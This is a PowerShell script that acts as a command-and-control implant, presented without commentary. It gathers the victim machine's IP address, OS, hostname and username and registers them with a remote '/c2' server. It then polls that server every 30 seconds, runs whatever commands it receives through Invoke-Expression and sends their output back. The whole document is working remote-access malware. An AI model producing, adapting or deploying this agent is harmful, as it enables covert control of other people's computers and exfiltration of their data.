# get the IP address, OS type, and hostname of the client
$ip_address = ((ipconfig | Select-String "IPv4 Address").ToString() -split ": ")[-1]
$os_type = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$hostname = (Get-WmiObject -Class Win32_ComputerSystem).Name
$username = [Environment]::UserName
$main_url = "http://10.0.0.9:8001"
$interval = 30
$intervalUnit = "Seconds"

# register the connection with the /register endpoint
$body = @{
    os_type = $os_type
    ip_address = $ip_address
    hostname = $hostname
    username = $username
} | ConvertTo-Json

Write-Host "IP Address: $ip_address"
Write-Host "OS Type: $os_type"
Write-Host "Hostname: $hostname"
Write-Host "Username: $username"

$url = "$main_url/c2/register"
$body = @{
    ip_address = $ip_address
    hostname = $hostname
    username = $username
    os = $os_type
} | ConvertTo-Json
$response = Invoke-RestMethod -Method Post -Uri $url -Body $body -ContentType "application/json"

# set the connection ID to the retrieved connection ID in the responseBody
$connection_id = $response.connection_id.ToString()

Write-Host "Registered connection with ID: $connection_id"

# while loop to check periodically for commands
# while loop to check periodically for commands
while ($true) {
    $url = "$main_url/c2/get-commands/$connection_id"
    Write-Host "Checking for commands at $url"
    $tasks = Invoke-RestMethod -Method Get -Uri $url

    # Process each task
    foreach ($task in $tasks.task_list) {
        Write-Host "Received command: $($task.command)"

        # if the command is "exit", break out of the loop
        if ($task.command -eq "exit") {
            write-host "Exiting..."
            break
        }

        # execute the command and send the response back to the server
        write-host "Executing command: $($task.command)"

        # Check if the command is an array
        if ($task.command -is [array]) {
            # Execute each command in the array
            foreach ($command in $task.command) {
                # Execute the command using Invoke-Expression
                $result = Invoke-Expression $command

                # Capture the output of the command as a string
                $output = $result | Out-String

                $body = @{
                    output = $output
                } | ConvertTo-Json
            
                $url = "$main_url/c2/add-command-output/$connection_id/$($task._id)"
                Invoke-RestMethod -Method Post -Uri $url -Body $body -ContentType "application/json"
            }
        } else {
            # Execute the command using Invoke-Expression
            $result = Invoke-Expression $task.command

            # Capture the output of the command as a string
            $output = $result | Out-String

            $body = @{
                output = $output
            } | ConvertTo-Json
        
            $url = "$main_url/c2/add-command-output/$connection_id/$($task._id)"
            Invoke-RestMethod -Method Post -Uri $url -Body $body -ContentType "application/json"
        }
    }

    # Sleep for the specified interval
    Start-Sleep -Seconds $interval
}
